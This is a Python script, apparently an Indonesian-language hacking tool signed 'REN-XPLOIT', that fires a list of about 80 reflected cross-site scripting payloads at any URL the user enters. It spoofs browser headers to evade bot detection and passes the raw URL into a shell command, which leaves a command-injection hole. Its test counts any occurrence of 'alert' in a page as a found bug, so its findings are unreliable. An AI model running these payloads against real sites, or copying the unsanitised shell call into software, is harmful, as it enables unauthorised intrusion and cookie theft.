import requests
import subprocess
from datetime import datetime  # Import modul datetime

# Warna untuk output
BLUE = "\033[94m"
RED = "\033[91m"
RESET = "\033[0m"

payloads = [
    "<script>alert('XSS')</script>",  # Basic script alert
    "<img src=x onerror=alert('XSS')>",  # Img tag onerror
    "<svg/onload=alert('XSS')>",  # SVG tag onload event
    "<input type='text' value='XSS' onfocus='alert(1)'>",  # Input field focus event
    "';alert('XSS')//",  # Injection in string
    "<body onload=alert('XSS')>",  # Body onload event
    "<iframe src='javascript:alert(1)'></iframe>",  # Inline iframe
    "<a href='javascript:alert(1)'>Click me</a>",  # JavaScript link
    "<div onmouseover='alert(1)'>Hover me</div>",  # Hover event
    "<script>eval('alert(1)')</script>",  # eval function
    "<script>document.write('<img src=x onerror=alert(1)>')</script>",  # Write payload to document
    "<script>location='javascript:alert(1)'</script>",  # Change location to alert
    "<script>document.location='javascript:alert(1)'</script>",  # Location script
    "<script>window.location='javascript:alert(1)'</script>",  # Window location change
    "<script>alert(document.cookie)</script>",  # Accessing cookies
    "<a href='javascript:alert(document.cookie)'>Click to show cookie</a>",  # Link with cookie alert
    "<script>document.getElementById('id').innerHTML = '<img src=x onerror=alert(1)>';</script>",  # Inject img tag into innerHTML
    "<script>window.onerror = function() { alert(1); }</script>",  # Handle window errors
    "<iframe srcdoc='<script>alert(1)</script>'></iframe>",  # Injecting script in iframe srcdoc
    "<div id='xss' onmouseover='alert(1)'>Hover Here</div>",  # Hover event in div
    "<form onsubmit='alert(1)'><input type='submit'></form>",  # Form submit event
    "<svg><script>alert(1)</script></svg>",  # SVG with script
    "<audio src='javascript:alert(1)' autoplay></audio>",  # Audio autoplay
    "<video src='javascript:alert(1)' autoplay></video>",  # Video autoplay
    "<marquee onstart='alert(1)'>Text</marquee>",  # Marquee element with alert
    "<details open ontoggle='alert(1)'><summary>Details</summary><p>More info</p></details>",  # Details element toggle event
    "<canvas onmousemove='alert(1)'></canvas>",  # Canvas mousemove event
    "<script>document.write('<img src=x onerror=alert(1)>');</script>",  # Write payload in document
    "<input type='button' value='Click' onclick='alert(1)'>",  # Button click alert
    "<button onclick='alert(1)'>Click</button>",  # Button click alert
    "<script>document.location='javascript:alert(1)';</script>",  # Location change script
    "<a href='javascript:alert(1)' onmouseover='alert(1)'>Link Hover</a>",  # Link hover event
    "<div style='background:url(javascript:alert(1))'>Click me</div>",  # Div with background url alert
    "<input type='text' value='XSS' onblur='alert(1)'>",  # Input blur event
    "<object data='javascript:alert(1)' type='text/html'></object>",  # Object with alert
    "<embed src='javascript:alert(1)' type='text/html'></embed>",  # Embed with alert
    "<frame src='javascript:alert(1)'></frame>",  # Frame with alert
    "<form action='javascript:alert(1)' method='get'></form>",  # Form with JS action
    "<button onclick='alert(1)'>Button</button>",  # Button event
    "<input type='text' value='XSS' onfocus='alert(1)'>",  # Input focus event
    "<div onclick='alert(1)'>Click me</div>",  # Div click event
    "<script>alert('<img src=x onerror=alert(1)>')</script>",  # Script with nested payload
    "<p onmouseover='alert(1)'>Hover me</p>",  # Paragraph hover event
    "<textarea onfocus='alert(1)'>Text</textarea>",  # Textarea focus event
    "<img src='x' onerror='this.src=1'>",  # Image onerror event
    "<iframe src='javascript:alert(1)'></iframe>",  # Inline iframe alert
    "<script>location.href='javascript:alert(1)';</script>",  # Change location
    "<b onmouseover='alert(1)'>Hover over me</b>",  # Bold hover event
    "<i onmouseover='alert(1)'>Hover over me</i>",  # Italic hover event
    "<h1 onmouseover='alert(1)'>Hover over me</h1>",  # Header hover event
    "<strong onmouseover='alert(1)'>Hover over me</strong>",  # Strong hover event
    "<section onmouseover='alert(1)'>Hover over me</section>",  # Section hover event
    "<svg><script>alert('XSS')</script></svg>",  # SVG with script
    "<script>eval('window.location.href = \"javascript:alert(1)\"');</script>",  # Eval with location change
    "<iframe srcdoc='javascript:alert(1)'></iframe>",  # Iframe with injected JS
    "<audio src='javascript:alert(1)' autoplay></audio>",  # Autoplay audio with XSS
    "<video src='javascript:alert(1)' autoplay></video>",  # Autoplay video with XSS
    "<style>@import url('javascript:alert(1)');</style>",  # CSS import with XSS
    "<form action='#' method='post' onsubmit='alert(1)'><input type='submit'></form>",  # Form submit alert
    "<textarea oninput='alert(1)'>Input Text</textarea>",  # Textarea input event
    "<input type='file' onfocus='alert(1)'>",  # Input file focus event
    "<button type='submit' onclick='alert(1)'>Submit</button>",  # Button submit alert
    "<div style='background:url(javascript:alert(1))'>Text</div>",  # Div with alert background
    "<a href='#' onclick='alert(1)'>Click me</a>",  # Link click event
    "<img src='x' onerror='alert(1);' width='1' height='1'/>",  # Image error event
    "<style>@import url('javascript:alert(1)');</style>",  # CSS import alert
    "<link href='javascript:alert(1)' rel='stylesheet'/>",  # Link CSS injection
    "<script src='javascript:alert(1)'></script>",  # External script injection
    "<div onmouseover='alert(1)' style='width:100px;height:100px;'>Hover Me</div>",  # Hover div with JS alert
    "<img src=x onerror=alert('XSS') onload='alert(2)'>",  # Image with error and load event
    "<video src='javascript:alert(1)' autoplay loop></video>",  # Video autoplay with XSS
    "<svg><script>alert('XSS')</script></svg>",  # SVG with script
    "<button type='submit' onclick='alert(1)'>Submit</button>",  # Button with onclick event
    "<form action='javascript:alert(1)' method='get'><input type='submit'></form>",  # Form submit action
    "<object data='javascript:alert(1)' type='text/html'></object>",  # Object with JS action
    "<input type='text' value='XSS' onfocus='alert(1)'>",  # Input with focus event
    "<a href='javascript:alert(1)'>Link</a>",  # Link with JS alert
    "<script>window.location.href='javascript:alert(1)'</script>"  # Location change script
]

website_url = input("Masukkan URL website (misalnya: https://example.com): ")

# Fungsi untuk menampilkan hasil dari curl
def run_curl(url, timeout):
    curl_command = f"curl -o /dev/null -s -w \"Time Total: %{{time_total}}s\nTime Connect: %{{time_connect}}s\nTime Pre-Transfer: %{{time_pretransfer}}s\nTime Start Transfer: %{{time_starttransfer}}s\n\" --max-time {timeout} {url}"
    result = subprocess.run(curl_command, shell=True, capture_output=True, text=True)
    print(f"{BLUE}Hasil curl untuk {url}:{RESET}")
    print(result.stdout)

# Fungsi untuk mengecek XSS (Reflected XSS)
def check_xss(url, timeout):
    for payload in payloads:
        # Menggunakan header untuk menghindari deteksi bot
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9,id;q=0.8",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Cache-Control": "max-age=0"
        }

        try:
            # Mengirim request GET dengan payload
            response = requests.get(url, params={"input": payload}, headers=headers, timeout=timeout)

            # Cek apakah payload XSS berhasil dijalankan
            if "alert" in response.text:
                timestamp = datetime.now().strftime("%H:%M:%S")  # Waktu saat itu (format jam:menit:detik)
                print(f"{BLUE}[+] XSS ditemukan di {url}{RESET}")
                print(f"{BLUE}[{timestamp}]•🔥 XSS BUG SUDAH BERHASIL DI TEMUKAN 🔥{RESET}")
                print(f"{BLUE}[{timestamp}][+] Penemuan Bug Oleh: REN-XPLOIT 🗿👍{RESET}")
                print(f"{BLUE}•Payload yang digunakan: {payload}{RESET}")
                print("-" * 35)
            else:
                print(f"{RED}[-] Tidak ada XSS di {url}{RESET}")

        except Exception as e:
            print(f"{RED}[-] Error saat mengecek {url}: {e}{RESET}")

# Menampilkan hasil curl terlebih dahulu
run_curl(website_url, timeout=10)  # Default timeout 10 detik untuk curl

# Input timeout dari user
try:
    timeout = int(input("Masukkan timeout (detik, misalnya 5): "))
except ValueError:
    print(f"{RED}[!] Timeout tidak valid, menggunakan nilai default 5 detik.{RESET}")
    timeout = 5

# Menjalankan pengecekan XSS
print(f"[*] Mengecek URL: {website_url}")
check_xss(website_url, timeout)
